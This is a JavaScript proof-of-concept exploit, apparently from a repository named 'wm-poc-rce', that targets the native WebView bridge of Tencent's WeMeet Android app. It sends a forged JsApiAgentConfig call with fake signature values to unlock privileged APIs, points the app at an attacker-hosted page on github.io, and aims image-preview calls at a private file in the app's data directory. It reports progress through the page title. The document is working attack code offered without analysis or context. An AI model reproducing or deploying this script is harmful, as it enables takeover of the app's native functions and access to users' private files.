(function(){
  document.title='P135TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P135CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P135TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P135TB-NOMGR:'+location.host;return}
  var zip='/data/user/0/com.tencent.wemeet.app/files/Global/Data/WebViewShare/5b0dd3209b376a05fc0678d96fb4c27c/6aede786b613dd5a2c7f0f810c71b2ea';
  var att='https://gitwhs.github.io/wm-poc-rce/p135atk.html';
  var cfg={
    url:att,
    corpId:'1',
    timestamp:'1',
    nonceStr:'a',
    signature:'a',
    sdkId:'-999',
    jsApiList:['ExportFile','LoadUrl','OpenNewPage','LoadTemplateWebView','PreviewImages','PreviewImage']
  };
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['AC','OpenApiPlugin','JsApiAgentConfig',cfg],
    ['PI','CommonPlugin','PreviewImages',{
      image_url:zip,
      images:[zip],
      path:zip,
      url:zip
    }],
    ['P1','CommonPlugin','PreviewImage',{
      image_url:zip,
      path:zip
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P135TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P135-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
